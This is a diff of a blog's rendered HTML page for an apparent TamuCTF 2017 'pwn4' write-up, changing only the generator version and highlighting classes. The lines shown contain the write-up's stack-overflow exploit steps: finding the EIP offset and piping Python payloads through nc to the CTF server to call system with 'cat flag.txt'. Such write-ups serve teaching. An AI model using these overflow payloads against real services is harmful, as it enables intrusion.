@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta name="generator" content="Hugo 0.29-DEV" />
+    <meta name="generator" content="Hugo 0.30-DEV" />
 
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -94,7 +94,7 @@ ga('send', 'pageview');
 <p>Is curious that this specific challenge had more value than the previous one (<a href="../pwn3/pwn3.md">pwn3</a>).<br />
 As we will see below, it was way easier. Lets take a look with r2.</p>
 <div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="">$ wget -q https://github.com/BlackHoods/BlackHoods.github.io/raw/master/assets/TamuCTF2017/pwn4/pwn4
-</span><span class="">$ r2 -A -c </span><span class="s">&#39;afl&#39;</span><span class=""> pwn4</span></code></pre>
+</span><span class="">$ r2 -A -c </span><span class="s1">&#39;afl&#39;</span><span class=""> pwn4</span></code></pre>
 </div>
 <div class="highlight"><pre class="chroma"><code class="language-r2" data-lang="r2"><span class="">[x] Analyze all flags starting with sym. and entry0 (aa)
 </span><span class="">[x] Analyze len bytes of instructions for references (aar)
@@ -237,7 +237,7 @@ As we will see below, it was way easier. Lets take a look with r2.</p>
 <p>Lets figure out, how many bytes do we need to overwrite <code>$eip</code> register.</p>
 <div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="">$ pwn cyclic </span><span class="m">40</span><span class=""> </span><span class="p">;</span><span class=""> To generate string with unique subsequences.
 </span><span class="">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa
-</span><span class="">$ r2 -R </span><span class="s">&#34;stdin=\&#34;`pwn cyclic 40`\&#34;&#34;</span><span class=""> -A -d -c </span><span class="s">&#39;dc&#39;</span><span class=""> pwn4</span></code></pre>
+</span><span class="">$ r2 -R </span><span class="s2">&#34;stdin=\&#34;`pwn cyclic 40`\&#34;&#34;</span><span class=""> -A -d -c </span><span class="s1">&#39;dc&#39;</span><span class=""> pwn4</span></code></pre>
 </div>
 <p><div class="highlight"><pre class="chroma"><code class="language-r2" data-lang="r2"><span class="">Process with PID 12102 started...
 </span><span class="">= attach 12102 12102
@@ -265,15 +265,15 @@ As we will see below, it was way easier. Lets take a look with r2.</p>
 <p>So, we can overwrite the <code>$eip</code> register writing the next 4 bytes (from byte 17 to 20)!<br />
 Now we create a file with the previously commented file (<code>flag2.txt</code>) to try this out.</p>
 
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="">$ </span><span class="n">echo</span><span class=""> This is the flag &gt; flag2.txt
-</span><span class="">$ python -c </span><span class="s">&#39;print(&#34;A&#34;*16 + &#34;\xcb\x84\x04\x08&#34;)&#39;</span><span class=""> </span><span class="p">|</span><span class=""> ./pwn4
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="">$ </span><span class="nb">echo</span><span class=""> This is the flag &gt; flag2.txt
+</span><span class="">$ python -c </span><span class="s1">&#39;print(&#34;A&#34;*16 + &#34;\xcb\x84\x04\x08&#34;)&#39;</span><span class=""> </span><span class="p">|</span><span class=""> ./pwn4
 </span><span class="">I require an input:
 </span><span class="hl"><span class="">This is the flag
 </span></span><span class="">Segmentation fault</span></code></pre>
 </div>
 
 <p>Good! what will the remote server say?</p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="">$ python -c </span><span class="s">&#39;print(&#34;A&#34;*16 + &#34;\xcb\x84\x04\x08&#34;)&#39;</span><span class=""> </span><span class="p">|</span><span class=""> nc pwn.ctf.tamu.edu </span><span class="m">4324</span><span class="">
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="">$ python -c </span><span class="s1">&#39;print(&#34;A&#34;*16 + &#34;\xcb\x84\x04\x08&#34;)&#39;</span><span class=""> </span><span class="p">|</span><span class=""> nc pwn.ctf.tamu.edu </span><span class="m">4324</span><span class="">
 </span><span class="">I require an input:                                                                              Did you really think it would be that easy?</span></code></pre>
 </div>
 <p>Ouch! that file was just a decoy. There must be a another one named <code>flag.txt</code> waiting for us.
@@ -304,7 +304,7 @@ The only thing we need to do is to pass a different argument: <code>cat flag.txt
 </ol>
 
 <p>Lets send to the server:</p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="">$ python -c </span><span class="s">&#39;print(&#34;A&#34;*16 + &#34;\xd9\x84\x04\x08&#34; + &#34;\x28\xa0\x04\x08&#34;)&#39;</span><span class=""> </span><span class="p">|</span><span class=""> nc pwn.ctf.tamu.edu </span><span class="m">4324</span><span class="">
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="">$ python -c </span><span class="s1">&#39;print(&#34;A&#34;*16 + &#34;\xd9\x84\x04\x08&#34; + &#34;\x28\xa0\x04\x08&#34;)&#39;</span><span class=""> </span><span class="p">|</span><span class=""> nc pwn.ctf.tamu.edu </span><span class="m">4324</span><span class="">
 </span><span class="">I require an input:
 </span><span class="">gigem</span><span class="o">{</span><span class="">R3TURN_0R13NT3D_PR0F1T</span><span class="o">}</span></code></pre>
 </div>
